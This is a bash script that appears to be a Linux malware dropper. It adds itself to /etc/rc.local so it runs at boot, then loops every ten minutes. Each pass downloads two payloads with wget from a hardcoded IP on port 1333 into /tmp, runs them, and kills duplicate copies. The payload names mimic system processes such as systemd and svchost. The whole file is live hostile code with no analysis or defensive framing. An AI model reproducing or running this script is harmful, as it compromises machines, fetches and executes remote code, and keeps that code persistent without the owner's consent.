#!/bin/bash
#Welcome like-minded friends to come to exchange.
#We are a group of people who have a dream.
#                qq:110110
#                2017-09-20

if [ "sh /etc/Lx988sy.sh &" = "$(cat /etc/rc.local | grep /etc/Lx988sy.sh | grep -v grep)" ]; then
    echo ""
else
    echo "sh /etc/Lx988sy.sh &" >> /etc/rc.local
fi

while [ 1 ]; do
    Centos_sshd_killn=$(ps aux | grep "/tmp/sysemddx64" | grep -v grep | wc -l)
    if [[ $Centos_sshd_killn -eq 0 ]]; then
        if [ ! -f "/tmp/sysemddx64" ]; then
            if [ -f "/usr/bin/wget" ]; then
                cp /usr/bin/wget .
                chmod +x wget
                #./wget -P . http://23.252.160.106:1333/sysemddx64
                ./wget -P /tmp/  http://23.252.160.106:1333/sysemddx64 &> /dev/null
                chmod 755 /tmp/sysemddx64
                rm wget -rf
            else
                echo "No wget"
            fi
        fi
        /tmp/sysemddx64 &
        #./sysemddx64 &
    elif [[ $Centos_sshd_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "sysemddx64" | grep -v grep | awk '{print $2}'); do
            Centos_sshd_killn=$(($Centos_sshd_killn-1))
            if [[ $Centos_sshd_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    Centos_ssh_killn=$(ps aux | grep "/tmp/svchosyn.sh" | grep -v grep | wc -l)
    if [[ $Centos_ssh_killn -eq 0 ]]; then
        if [ ! -f "/tmp/svchosyn.sh" ]; then
            if [ -f "/usr/bin/wget" ]; then
                cp /usr/bin/wget .
                chmod +x wget
                #./wget -P .  http://23.252.160.106:1333/svchosyn.sh
                ./wget -P /tmp/  http://23.252.160.106:1333/svchosyn.sh &> /dev/null
                chmod 755 /tmp/svchosyn.sh
                rm wget -rf
            else
                echo "No wget"
            fi
        fi
        /tmp/svchosyn.sh &
        #./svchosyn.sh &
    elif [[ $Centos_ssh_killn -gt 1 ]]; then
        for killed in $(ps aux | grep "svchosyn.sh" | grep -v grep | awk '{print $2}'); do
            Centos_ssh_killn=$(($Centos_ssh_killn-1))
            if [[ $Centos_ssh_killn -eq 1 ]]; then
                continue
            else
                kill -9 $killed
            fi
        done
    else
        echo ""
    fi

    sleep 600
done

